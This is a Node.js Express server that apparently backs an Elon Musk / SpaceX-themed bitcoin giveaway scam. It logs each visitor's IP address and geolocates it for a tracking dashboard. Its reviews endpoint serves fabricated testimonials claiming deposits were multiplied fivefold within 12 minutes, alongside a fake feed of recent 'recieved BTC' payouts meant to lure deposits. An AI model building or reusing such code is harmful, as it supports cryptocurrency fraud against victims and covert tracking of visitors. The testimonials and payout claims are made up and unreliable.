
import express from 'express';
import dotenv from 'dotenv';
import path from 'path';
import cors from 'cors'
import DBconnection from './db_connection.js';

import { fileURLToPath } from 'url';


const pss = dotenv.configDotenv({ path: '', encoding: 'latin1', quiet: false, debug: true, override: false })

const app = express();
const PORT = process.env.PORT || 3350;


app.use(express.json());
// Define __dirname for ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
app.use(express.json());

app.use(cors({
  origin: "null", // Or '*' for all origins
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'], // Allowed methods
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization', 'credentials'] // Allowed headers
}));

app.use(express.static(path.join(path.basename(''), 'www')));
const router = express.Router()
app.use('',router)

// Default route
router.get('/t', async (req,res) =>{
  
      const query = `
          CREATE TABLE IF NOT EXISTS spacex_View (
             date VARCHAR(255),
             Ip VARCHAR(255), 
             country VARCHAR(100),
            city VARCHAR(50),
            page VARCHAR(255)
          )`;
        try {
     
      await DBconnection.query(query); 
      console.log('✅ Table created successfully');
      res.json({msg: '✅ Table created successfully'})
    } catch (err) { 
      console.error('❌ Error creating table', err);
    } finally {
     
    }
  
    
})

app.get('', (req, res) => {
    
  res.sendFile(path.join(__dirname, 'www', 'index.html')); 
 
});


let pageViews = [];
router.get('/dashboard', (req, res) =>{
res.sendFile(path.join(__dirname, 'www', 'dashboard.html')); 
});

router.post('/dash-api', async (req,res)=>{

      let home;
      let reward;
 res.setHeader('Access-Control-Allow-Origin', 'null');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
       await DBconnection.query(`

        SELECT * FROM spacex_view WHERE page = $1
          
        `,['home']).then(data =>{
            home = data.rows
        });

        await DBconnection.query(`
        SELECT * FROM spacex_view WHERE page = $1
          
        `,['reward']).then(data =>{
            reward = data.rows
        });
               console.log({home_stats_data: home, reward_stats_data: reward})
       res.json({home_stats_data: home, reward_stats_data: reward});
})

router.post("/track-view", async (req, res) => {
  console.log(req.body)
  if (req.body.page == 'home') {
    
               const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress;

  let location = {};

  try {
const response = await fetch(`https://ipwho.is/${ip}`);



    location = await response.json();
    console.log(location)
  } catch (error) {
    location = { error: "Location lookup failed" };
    console.log(location)
  }

  const viewData = {
    time: new Date(),
    ip,
    country: location.country,
    city: location.city,
  };

  pageViews.push(viewData);
  console.log(viewData); 
      await DBconnection.query(
        `INSERT INTO spacex_View (date, Ip, country, city, page)
         VALUES ($1, $2, $3, $4, $5) RETURNING  date, Ip, country, city, page`,
        [ viewData.time, viewData.ip, viewData.country, viewData.city , req.body.page]
      ).then(async function (params) {
         if (params.rowCount ==1) {
          console.log(params.rows)
      
          res.json({msg:'successful'})
         }
      })
        

  }else if (req.body.page == 'reward') {
        
    const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress;

  let location = {};

  try {
const response = await fetch(`https://ipwho.is/${ip}`);



    location = await response.json();
    console.log(location)
  } catch (error) {
    location = { error: "Location lookup failed" };
    console.log(location)
  }

  const viewData = {
    time: new Date(),
    ip,
    country: location.country,
    city: location.city,
  };

  pageViews.push(viewData);
  console.log(viewData);  await DBconnection.query(
        `INSERT INTO spacex_View (date, Ip, country, city, page)
         VALUES ($1, $2, $3, $4, $5) RETURNING  date, Ip, country, city, page`,
        [ viewData.time, viewData.ip, viewData.country, viewData.city , req.body.page]
      ).then(async function (params) {
         if (params.rowCount ==1) {
          console.log(params.rows)
      
          res.json({msg:'successful'})
         }
      })


  }
  
});

router.get('/reward', (req, res) => {
    
    res.sendFile(path.join(__dirname, 'www', 'reward.html'));
    
});

router.post('/reward/reviews', (req, res) => {
  
  
  const initial_data = [
    
    {
      address : '3Et13WwN4D8HHTLSPn56rhGf3aMrk6aZSF',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : '3G7jcEELKh38L6kaSV8K35pTqsh5bgZW2D   ',
      content_source: 'Everything went through smoothly, which made the experience enjoyable. 0.3 BTC recieved',
      Image_src_url :'/asset/img/0.3.jpeg'
    },
    
      
    {
      address : 'bc1qxcn9965xwztdh965cp06279q5ne0zz6t27vgs0',
      content_source: 'The giveaway experience was better than expected, with no complications. 0.8 BTC recieved',
      Image_src_url :'/asset/img/0.8.jpeg'
    },
    
      
    {
      address : 'bc1qcqveykpxevkhvxg0742xwys8g9hvqzs7hjf2ek',
      content_source: 'I wasn’t sure what to expect, but the process turned out to be smooth and easy. thank you Elon Musk.',
      Image_src_url :'/asset/img/0.500.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'A clean and straightforward experience giveaway im really impressed. thank you Elon Musk.',
      Image_src_url :'/asset/img/3.6.jpeg'
    },
    
      
    {
      address : '3Et13WwN4D8HHTLSPn56rhGf3aMrk6aZSF',
      content_source: 'Easy to use and well-organized giveaway.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
      
    {
      address : '35BpUGMm4Cod9dVWwdTJK1A4RDsCE3zTVC',
      content_source: 'Overall, the giveaway  experience was straightforward and easy to complete',
      Image_src_url :'/asset/img/8.5.jpeg'
    },
    
      
    {
      address : '3G7jcEELKh38L6kaSV8K35pTqsh5bgZW2D',
      content_source: 'The platform was responsive and easy to use, making the process hassle-free.',
      Image_src_url :'/asset/img/10.6.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'I appreciated how smooth and organized the entire experience was. i was credited 1 BTC',
      Image_src_url :'/asset/img/1.0.jpeg'
    },
    
      
    {
      address : '18uhzy546Qz7CxRNkHohg4W9VSkfTkbSvY',
      content_source: ' I had a positive experience participating on this giveaway. Everything was handled promptly and smoothly. got 14.7 BTC',
      Image_src_url :'/asset/img/14.7.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'The giveaway was simple, and the process went through faster than I expected.',
      Image_src_url :'/asset/img/0.3.jpeg'
    },
    
      
    {
      address : 'bc1qmdwdtm4uf76qauwlxxkjxhzt827phx3ktz75pm',
      content_source: 'I tried the giveaway and everything worked smoothly. The process was straightforward and efficient. I got 3 BTC',
      Image_src_url :'/asset/img/3.6.jpeg'
    },
    
      
    {
      address : 'bc1qmdwdtm4uf76qauwlxxkjxhzt827phx3ktz75pm',
      content_source: 'I had a positive experience using the platform. Everything was handled promptly and smoothly.',
      Image_src_url :'/asset/img/0.3.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'The speed stood out to me 0.01 BTC in, 0.05 BTC credited in 12 minutes.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
      
    {
      address : '3KhgsfM93Dkg359svoKcXQieRk2Z3yxFez ',
      content_source: 'I found the process to be efficient and well-managed. Overall, a solid experience.',
      Image_src_url :'/asset/img/14.7.jpeg'
    },
    
      
    {
      address : 'bc1qpjn7ecv8h9c3tksflzwuct0829jsnvvtlra5w9',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : '14idxgxnsdZ3Wz698AyMRUkjzU7hqXA7Af',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : 'bc1qszfu7qa9ylms987se2445s63hahh589h7w74gs ',
      content_source: 'I was genuinely impressed—after depositing 0.01 BTC, I received 0.05 BTC in just 12 minutes.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
      
    {
      address : '12p7nuaYbjF76vtG192pupaNeFVPYgiYKe ',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : '18dJ8V2vktdQ8fx1HwEZrvitbuUTmo2NjU',
      content_source: 'The speed stood out to me 0.01 BTC in, 0.05 BTC credited in 12 minutes. 1 BTC recieved',
      Image_src_url :'/asset/img/0.5.jpeg'
    },
    
      
    {
      address : '18dJ8V2vktdQ8fx1HwEZrvitbuUTmo2NjU',
      content_source: 'Everything went through smoothly, which made the experience enjoyable. 3 BTC recieved',
      Image_src_url :'/asset/img/3.6.jpeg'
    },
    
      
    {
      address : '1FKA5DuzpsfMgfDFfPh7ZkN5h62sjH1obe ',
      content_source: 'I deposited 2.7 BTC, and my account reflected 14.7 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/14.7.jpeg'
    },
  ]






  const refresh = [
        
    {
      address : '18uhzy546Qz7CxRNkHohg4W9VSkfTkbSvY',
      content_source: ' I had a positive experience using the platform. Everything was handled promptly and smoothly.  I just got 10 BTC WOW',
      Image_src_url :'/asset/img/10.6.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'The setup was simple, and the process went through faster than I expected.',
      Image_src_url :'/asset/img/0.8.jpeg'
    },
    
      
    {
      address : 'bc1qmdwdtm4uf76qauwlxxkjxhzt827phx3ktz75pm',
      content_source: 'I tried the giveaway and everything worked smoothly. The process was straightforward and efficient. Got 4 BTC',
      Image_src_url :'/asset/img/4.0.jpeg'
    },
    
      
    {
      address : 'bc1qmdwdtm4uf76qauwlxxkjxhzt827phx3ktz75pm',
      content_source: 'I had a positive experience using the platform. Everything was handled promptly and smoothly.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'The speed stood out to me 0.01 BTC in, 0.05 BTC credited in 12 minutes.',
      Image_src_url :'/asset/img/0.5.jpeg'
    },
    
      
    {
      address : '3KhgsfM93Dkg359svoKcXQieRk2Z3yxFez ',
      content_source: 'I found the giveaway process to be efficient and well-managed. Overall, a solid experience.',
      Image_src_url :'/asset/img/0.3.jpeg'
    },
    
      
    {
      address : 'bc1qpjn7ecv8h9c3tksflzwuct0829jsnvvtlra5w9',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : '14idxgxnsdZ3Wz698AyMRUkjzU7hqXA7Af',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : 'bc1qszfu7qa9ylms987se2445s63hahh589h7w74gs ',
      content_source: 'I was genuinely impressed—after depositing 0.01 BTC, I received 0.05 BTC in just 12 minutes.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
      
    {
      address : '12p7nuaYbjF76vtG192pupaNeFVPYgiYKe ',
      content_source: 'I deposited 2 BTC, and my account reflected 8.5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/8.5.jpeg'
    },
    
      
    {
      address : '18dJ8V2vktdQ8fx1HwEZrvitbuUTmo2NjU',
      content_source: 'The speed stood out to me 0.8 BTC in, 4 BTC credited in 12 minutes. 1 BTC recieved',
      Image_src_url :'/asset/img/4.0.jpeg'
    },
    
      
    {
      address : '18dJ8V2vktdQ8fx1HwEZrvitbuUTmo2NjU',
      content_source: 'Everything went through smoothly, which made the experience enjoyable. 3 BTC recieved',
      Image_src_url :'/asset/img/3.6.jpeg'
    },
    
      
    {
      address : '1FKA5DuzpsfMgfDFfPh7ZkN5h62sjH1obe ',
      content_source: 'I deposited 2.8 BTC, and my account reflected 14.7 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/14.7.jpeg'
    },
    {
      address : '1AWMKHqxYQh9rLsNjRhE5BoLKoxuMPb96v ',
      content_source: 'The giveaway experience was better than expected, with no complications.',
      Image_src_url :'/asset/img/1.0.jpeg'
    },
    
      
    {
      address : '18dJ8V2vktdQ8fx1HwEZrvitbuUTmo2NjU',
      content_source: '  I deposited 2.2 BTC, and the balance updated to 10.8 BTC in under 12 minutes.',
      Image_src_url :'/asset/img/10.8.jpeg'
    },
    
      
    {
      address : '1CDdDSmhivcExJvHvSAokCBYLFHKWyaA1S ',
      content_source: '     I started with at 2.15 BTC deposit and received 10.6 BTC within 12 minutes. The experience exceeded my expectations.',
      Image_src_url :'/asset/img/10.6.jpeg'
    },
    
      
    {
      address : 'bc1qjjdgf8s46w9lvrd9w5dy8c932q2jg2w6jjaqc6',
      content_source: 'I was impressed by how quickly the transaction completed 1.6 BTC turned into 7.9 BTC in 12 minutes.',
      Image_src_url: '/asset/img/7.9.jpeg' 
    },
    
      
    {
      address : '3G7jcEELKh38L6kaSV8K35pTqsh5bgZW2D',
      content_source: 'A clean and straightforward giveaway experience.',
      Image_src_url :'/asset/img/0.8.jpeg'
    },
    
      
    {
      address : '18uhzy546Qz7CxRNkHohg4W9VSkfTkbSvY',
      content_source: 'The giveaway processed my 2.5 BTC deposit and credited 14 BTC in just 12 minutes.',
      Image_src_url :'/asset/img/14.7.jpeg'
    },
    
      
    {
      address : 'bc1qmdwdtm4uf76qauwlxxkjxhzt827phx3ktz75pm',
      content_source: 'The system credited 0.5 BTC approximately 12 minutes after my 3 BTC deposit.',
      Image_src_url :'/asset/img/3.6.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'A deposit of 0.1 BTC resulted in a credited balance of 0.5 BTC within 12 minutes.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
     
  
  ]


  const transaction = [

'1K5krzbQiEHh9Rq1VMtDCJQbmMmJw2sUJM recieved 0.8 BTC  ( 5 secs ago)',
 '14kqceo1pmfJ6CQBTqrHfytApnYz1cvP4A recieved 0.3 BTC  ( 3 secs ago)',
 '1PkLtRtQ1rqJ965YodANZPFJ1TCTg5M7Rm recieved 0.5 BTC  ( 7 secs ago)',
 '13e4oSQwVmqkjSbUox2bCThi34447iy53s recieved 8.476 BTC  ( 8 secs ago)',
 '124Bk9gdrJ14SuDJ84uV3b3HxeCTKwiUtV recieved 1.0443 BTC  ( 2 secs ago)',
 '1G4KvS351gcs6GBjiY5vojCcwZhsyAX3q7 recieved 5.887 BTC  ( 6 secs ago)',
 '1KE41pjjgYMhBL36mDVoJvk8rgJHD8CRou recieved 3.2076 BTC  ( 9 secs ago)',
 '16q5kumWZqWkWDrQP7qLsKJ2Hk47JimvmN recieved 5.2032 BTC  ( 23 secs ago)',
 '1AP6fByHuqSGmF1kQJZYfkTCqbbnEzRaKe recieved 0.576 BTC  ( 5 secs ago)',
 '168MweXydfMj46wKUociRbgmh4cG4QuSo3 recieved 5.565 BTC  ( 5 secs ago)',
 '168MweXydfMj46wKUociRbgmh4cG4QuSo3 recieved 14.732 BTC  ( 10 secs ago)',
 '1JSMZpbgWmiFoYwRZZn6munAzs1JuRjzD5 recieved 7.654 BTC  ( 4 secs ago)',
 '13RW3CHFkKWWxTM7oM8RQZYs1M44rBWvsf recieved 3.865 BTC  ( 5 secs ago)',
 '1KgjNWUtWYzqJCv4FE5MLq9siRWS7CqNpZ recieved 1.0543 BTC  ( 5 secs ago)',
 '1GodoFvpqWdfALxb9FpzJbJiF4WHncpfm6 recieved 8.587 BTC  ( 40 secs ago)',
 '18ThWCKPN6R1MV6zvAnNUa3Pk5HaQmnrAz recieved 7.287 BTC  ( 5 secs ago)',
 '1EgJ55AmWhpxJpTpnUyFL3WT6PdC7zFZRB recieved 10.543 BTC  ( 5 secs ago)',
 '1B15xXaVhzoXU7tGxu8JqvuXw9WywSz1w8 recieved 4.007 BTC  ( 8 secs ago)',
 '16pmJtNznhTZLYhpCBxQ1S4KFdxynEx38v recieved 2.4307 BTC  ( 11 secs ago)',
 '1h9TTeBeaEFohhLKKxuNmk3R72CU5mFGr recieved 9.543 BTC  ( 8 secs ago)',
 '1F9PsCS3QZvZdwBT73Bdz88k9K5HgpFJ7A recieved 1.897 BTC  ( 7 secs ago)',
 '1MM4knEh3hrNMbvXWuuqnbKJP6AUp5qyBv recieved 0.94 BTC  ( 8 secs ago)',
 '18Z5ZDqJZ6SKmyp3EJ8yf5T6zbCRuCrEW2 recieved 6.487 BTC  ( 15 secs ago)',
 '1DEcYy7EanPvAaxJbXZJQPJUX44QH4K8Af recieved 4.089 BTC  ( 7 secs ago)',
 '1P1DUMFp15KVXLqHZUPhvnsxHVyZ6o1cWK recieved 8.543 BTC  ( 14 secs ago)',
 '1QKzvWdfJ7c8oAMmwFpkZsxXzMkf6gG8E7 recieved 0.05 BTC  ( 8 secs ago)',
 '17PVu4AKuZQyyzJt1pr8FtPWCuYHjUWYxE recieved 0.087 BTC  ( 6 secs ago)',
 '1HKFQyk1KkShX1euZRjKGNVPtjiQ43BSCn recieved 7.435 BTC  ( 5 secs ago)',
 '1CCtPE74fDXKWZJjoPgFtN4tdakosDKtjQ recieved 0.789 BTC  ( 3 secs ago)',
 '1DutbAyBbFM51dHnYk6y6muQW5Csgcjk5P recieved 0.387 BTC  ( 1 sec ago)',
 '15Gpp8uJsPkM2W6PSHZV1DvBe3dUeMi7WF recieved 3.886 BTC  ( 7 secs ago)',
 '1PDDmdQ4Kjz8LEtU3WWrK6oYfjrUxFoUG1 recieved 10.543 BTC  (4 secs ago)',
  '16paBt4yPpLo7CxT4zwgXBrSqpCVzNxWFH recieved 1.543 BTC  (8 secs ago)',
'1EquSP51hVSCesMH4ZefWsFkSWA9hTZ3jy recieved 9.543 BTC  (7 secs ago)',
'1AwuM9mm24o4VVFSG5U9SybbAWkWqntBhL recieved 4.543 BTC  (14 secs ago)',
'1FJRgYJJLHPxuMi9ud1dKVHNQsGvoDd2YU recieved 1.43 BTC  (5 secs ago)',
'15uFqG4bjTUBLfaHgtqCa3hbUkRxuy8NYi recieved 1 BTC  (4 secs ago)',
'1538Mtdh5kEf5pd42bPgntJjzV1ebywgxW recieved 0.7543 BTC  (9 secs ago)',
'15t3quTQzg8kpLX2XD7GswspBPTcnUybC9 recieved 2.543 BTC  (4 secs ago)',
'1A51KbJUupvfaYKrqJtcGcxJnn9peY8xzh recieved 0.543 BTC  (50 secs ago)',
'1NNYKpJ5Cj6r8q9Ti6aZDBfwsbR47bRs9Y recieved 0.943 BTC  (4 secs ago)',
'1D2AHBWveyGENpaRnRpGEnvYcdD4SdkLJF recieved 0.743 BTC  (10 secs ago)',
'18zsNq4D4QERSP523hL2ju1EvSBqVEk1mZ recieved 0.843 BTC  (4 secs ago)',
'13pKyXNeiBd1eTEkEnTDBWPdEd4pD2n5va recieved 0.643 BTC  (9 secs ago)',
'1CUoGAqn2nEzvZbtRa3wfLhLGFmoJQiZh4 recieved 0.843 BTC  (8 secs ago)',
'1LSTvgXzDxsoLfWzbSvbb4xeUM5zRonuds recieved 1.543 BTC  (4 secs ago)',
'152Jfu2kFq9W7wwTVHpKqswn39WvPXH3ty recieved 2.43 BTC  (8 secs ago)',
'1HyTjHRYWZL4iRuLw6SWAkaWhkuAZNhM7f recieved 0.893 BTC  (4 secs ago)',
'19Zpzo6gBZpu1BWHgwY5379gRFjhStAJ7t recieved 0.9543 BTC  (4 secs ago)',
'1Pm6EP8TDqtRWxHhyTkWTsuSqxYRdAe1B8 recieved 8.543 BTC  (4 secs ago)',


  ]
  res.json({initial_data_list : initial_data, refresh: refresh, transaction:transaction})

});







app.use(express.static(path.join(path.dirname('public'))));


app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));